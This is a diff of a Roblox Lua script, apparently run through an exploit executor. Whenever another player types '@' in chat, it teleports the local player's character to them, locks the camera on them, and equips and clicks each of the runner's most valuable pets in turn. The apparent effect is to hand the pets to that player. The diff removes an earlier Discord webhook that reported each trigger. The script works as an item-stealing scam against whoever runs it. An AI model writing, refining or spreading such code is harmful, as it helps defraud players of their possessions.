@@ -3,139 +3,92 @@ local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local Camera = workspace.CurrentCamera
-local UserInputService = game:GetService("UserInputService")
 
--- CONFIG (PUT YOUR WEBHOOK HERE)
-local WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
-
--- PET PRIORITY (Highest to Lowest)
 local PET_PRIORITY = {
-    ["T-Rex"] = 100,
-    ["Dragonfly"] = 90,
-    ["Queen bee"] = 85,
-    ["Disco bee"] = 80,
-    ["Raccoon"] = 75,
-    ["Mimic Octopus"] = 70,
-    ["Butterfly"] = 65
+	["T-Rex"] = 100,
+	["Dragonfly"] = 90,
+	["Queen bee"] = 85,
+	["Disco bee"] = 80,
+	["Raccoon"] = 75,
+	["Mimic Octopus"] = 70,
+	["Butterfly"] = 65
 }
 
--- ITEMS TO IGNORE
-local IGNORE_ITEMS = {
-    "Shovel",
-    "Destroy Plants"
+local IGNORED = {
+	["Shovel [Destroy Plants]"] = true,
+	["Sprinkler"] = true
 }
 
---[[ WEBHOOK FUNCTIONS ]]--
-local function sendWebhook(content)
-    local payload = {
-        content = content,
-        embeds = {{
-            title = "Roqate - 2025",
-            description = "Player triggered the system",
-            color = 0xFF0000
-        }}
-    }
-    pcall(function()
-        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
-    end)
+local function getSortedItems()
+	local items = {}
+	for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
+		if not IGNORED[tool.Name] then
+			local score = 0
+			for pet, pts in pairs(PET_PRIORITY) do
+				if string.find(tool.Name, pet) then
+					score = pts
+					break
+				end
+			end
+			table.insert(items, {tool = tool, score = score})
+		end
+	end
+	table.sort(items, function(a, b) return a.score > b.score end)
+	return items
 end
 
---[[ ITEM SYSTEM ]]--
-local function getBestItem()
-    local bestItem, highestScore = nil, 0
-    
-    for _,item in pairs(LocalPlayer.Backpack:GetChildren()) do
-        -- Skip ignored items
-        local shouldIgnore = false
-        for _,ignore in pairs(IGNORE_ITEMS) do
-            if string.find(item.Name, ignore) then
-                shouldIgnore = true
-                break
-            end
-        end
-        if shouldIgnore then continue end
-        
-        -- Check pet priority
-        local score = 0
-        for pet, points in pairs(PET_PRIORITY) do
-            if string.find(item.Name, pet) then
-                score = points
-                break
-            end
-        end
-        
-        if score > highestScore then
-            highestScore = score
-            bestItem = item
-        end
-    end
-    
-    return bestItem
+local function faceLoop(target)
+	local conn = RunService.RenderStepped:Connect(function()
+		if target and target.Position then
+			Camera.CFrame = CFrame.new(Camera.CFrame.Position, target.Position)
+		end
+	end)
+	return conn
 end
 
---[[ INTERACTION SYSTEM ]]--
-local function interactWithPlayer(target)
-    -- Get target character
-    local targetChar = target.Character or target.CharacterAdded:Wait()
-    local torso = targetChar:WaitForChild("UpperTorso") or targetChar:WaitForChild("Torso")
-    local head = targetChar:WaitForChild("Head")
+local function interactWith(player)
+	local targetChar = player.Character or player.CharacterAdded:Wait()
+	local targetTorso = targetChar:FindFirstChild("HumanoidRootPart") or targetChar:FindFirstChild("UpperTorso") or targetChar:FindFirstChild("Torso")
+	if not targetTorso then return end
 
-    -- Teleport to target (4 studs away)
-    LocalPlayer.Character.HumanoidRootPart.CFrame = torso.CFrame * CFrame.new(0, 0, -4)
+	local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+	char:WaitForChild("HumanoidRootPart").CFrame = targetTorso.CFrame * CFrame.new(0, 0, -4)
 
-    -- Force first-person view
-    LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
-    LocalPlayer.CameraMaxZoomDistance = 0.5
-    LocalPlayer.CameraMinZoomDistance = 0.5
+	LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
+	LocalPlayer.CameraMaxZoomDistance = 0.5
+	LocalPlayer.CameraMinZoomDistance = 0.5
 
-    -- Look at target continuously
-    local lookConn
-    lookConn = RunService.Heartbeat:Connect(function()
-        Camera.CFrame = CFrame.new(Camera.CFrame.Position, head.Position)
-    end)
+	local camConn = faceLoop(targetTorso)
 
-    -- Equip best item
-    local item = getBestItem()
-    if item then
-        LocalPlayer.Character.Humanoid:EquipTool(item)
-    end
+	local tools = getSortedItems()
+	for _, data in ipairs(tools) do
+		local tool = data.tool
+		if tool and tool.Parent == LocalPlayer.Backpack then
+			LocalPlayer.Character.Humanoid:EquipTool(tool)
+			mouse1press()
+			task.wait(5)
+			mouse1release()
+		end
+	end
 
-    -- Click and hold for 5 seconds (center screen)
-    UserInputService:SetMouseLocation(0.5, 0.5)
-    mouse1press()
-    task.wait(5)
-    mouse1release()
-
-    -- Cleanup
-    if lookConn then lookConn:Disconnect() end
+	if camConn then camConn:Disconnect() end
 end
 
---[[ CHAT DETECTION ]]--
 local function onChatted(player, msg)
-    if player == LocalPlayer then return end
-    if not string.find(msg, "@") then return end
-    
-    -- Send webhook alert
-    sendWebhook(player.Name.." triggered the system with @ mention")
-    
-    -- Interact with player
-    interactWithPlayer(player)
+	if player == LocalPlayer then return end
+	if string.find(msg, "@") then
+		task.defer(function()
+			interactWith(player)
+		end)
+	end
 end
 
---[[ INITIALIZATION ]]--
--- Set up chat listeners
-for _,player in pairs(Players:GetPlayers()) do
-    if player ~= LocalPlayer then
-        player.Chatted:Connect(function(msg)
-            onChatted(player, msg)
-        end)
-    end
+for _, p in ipairs(Players:GetPlayers()) do
+	if p ~= LocalPlayer then
+		p.Chatted:Connect(function(msg) onChatted(p, msg) end)
+	end
 end
 
-Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(msg)
-        onChatted(player, msg)
-    end)
+Players.PlayerAdded:Connect(function(p)
+	p.Chatted:Connect(function(msg) onChatted(p, msg) end)
 end)
-
-print("✅ SYSTEM ACTIVE - Waiting for @ mentions")
